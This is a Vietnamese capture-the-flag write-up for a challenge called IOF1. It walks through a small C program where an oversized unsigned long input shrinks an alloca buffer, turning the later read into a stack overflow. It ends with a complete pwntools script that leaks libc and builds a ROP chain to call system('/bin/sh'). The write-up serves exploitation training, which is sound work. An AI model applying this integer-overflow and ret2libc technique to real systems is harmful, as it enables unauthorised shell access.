# IOF1

**source**

```c 

#include <stdio.h>
#include <alloca.h>
#include <unistd.h>

void init()
{
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	setbuf(stderr, 0);
}

void read_str(char *buffer, unsigned long int n)
{
	char c;
	unsigned long int i = 0;
	while (i < n)
	{
		read(0, &c, 1);
		if (c == '\n')
			break;
		buffer[i] = c;
		i++;
	}
	buffer[i] = '\0';
}

int main()
{
	char *buffer;
	unsigned long int n;

	init();

	puts("Secret saver!");
	puts("How long is your secret?");
	printf("> ");
	scanf("%lu", &n);

	buffer = alloca(n*8);
	printf("Enter your secret: ");
	read_str(buffer, n);
}

```

### phân tích soucre:

- 1 lần đầu làm đọc qua thì ko thể nào tìm được hướng khai thác nào hết, ko có hàm get_shell hay win gì hết, ko có fmt luôn ,trong file đề thì có sẵn file libc, **nên khả năng cao ta sẽ dùng ret2libc**

- phân tích qua hàm main thì ta thấy có hàm alloca() thì hàm này có chức năng tương tự như malloc là cấp phát bộ nhớ nhưng thay vì nằm trên heap như malloc thì alloca cấp phát bộ nhớ trên stack. **ví dụ alloca(16) sẽ cấp phát 16 byte**

- tại hàm **read_str** thì nó cho phép ta nhập vào số byte bằng biến n mà ta nhập vào, **vậy nếu ta nhập số bé thì nhập được ít, nhập số lớn thì nhập được nhiều**

- **buffer = alloca(n*8)**, hmmm , nếu vậy ta cứ tăng biến n lên 1 giá trị thì sẽ tăng thêm 1 stack 

hướng của ta là ret2libc nên ta cần nhập 1 số lượng lớn để hàm read_str có thể thoải mái nhập được

vậy h ta thử nhập **1000000** xem sao


![image](https://github.com/gookoosss/CTF/assets/128712571/40d816fe-0435-4fef-b956-a1eac53c6c12)


ko ổn rồi, **lúc này chương trình tạo ra quá nhiều vùng nhớ**, 1000000 stack làm chương trình lặp liên tục không hồi kết, khả năng bị tràn ngăn xếp, chương trình vòng lặp không kết thúc , do truy cập bộ nhớ ngăn xếp liên tục, **Segmentation fault (core dumped)**

`thế bây giờ ta phải làm sao để vừa muốn alloca() nhận vào giá trị càng nhỏ , mà vừa muốn được nhập vào read_str thỏa thik đây `

sau khi được hint nhiều lần thì cách duy nhất đó là **lợi dụng lỗi iof tại buffer = alloca(n*8)** ;

![image](https://github.com/gookoosss/CTF/assets/128712571/78e423fd-8c0d-4a20-8de9-3d895259fdcb)


như ta thấy thì **n có kiểu giá trị là unsigned long int**, ta đang làm trên file 64bit, như ảnh trên thì **giới hạn của unsigned long là 18446744073709551615**, vậy nếu ta thử **tăng thêm 1 thành 18446744073709551616 thì chả phải đã có lỗi iof sao**, ```lúc này alloca(n*8) sẽ nhận vào 1 giá trị siêu nhỏ (thường là số âm) nên ta sẽ ko còn bị lỗi Segmentation fault (core dumped) nữa```

giờ ta thử nhập **18446744073709551616** xem sao


![image](https://github.com/gookoosss/CTF/assets/128712571/6cacd715-b22e-4777-8286-b3e2fec225be)


**deeee lúc này ta đến được với hàm read_str rồi nè**

chà lúc này có thêm lỗi BOF, nên ta sẽ khai thác leak libc và ret2libc tại đây 

### script:

```python 

#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")
context.binary = exe
p = process([exe.path])

gdb.attach(p, gdbscript = '''
b*main+262           
c           
           
''')


input()

pop_rdi = 0x00000000004013e3

###################################
### State 1 : khai thác lỗi iof ###
###################################

payload = b'18446744073709551616'
p.sendlineafter(b'> ' , payload)

###################################
### State 2 : eak libc address  ###
###################################

payload = b'a'*24 # offset có thể khác nhau tùy thuộc vào giá trị biến n ta nhập vào 
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
p.sendlineafter(b'secret: ' , payload)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x783a0
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

# lúc này ta chạy lại hàm main rồi 

# tiếp tục khai thác lỗi iof

payload = b'18446744073709551616'
p.sendlineafter(b'> ' , payload)

###################################
### State 3 : tạo shell         ###
###################################

payload = b'a'*24
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])

p.sendlineafter(b'secret: ' , payload)

p.interactive()





```







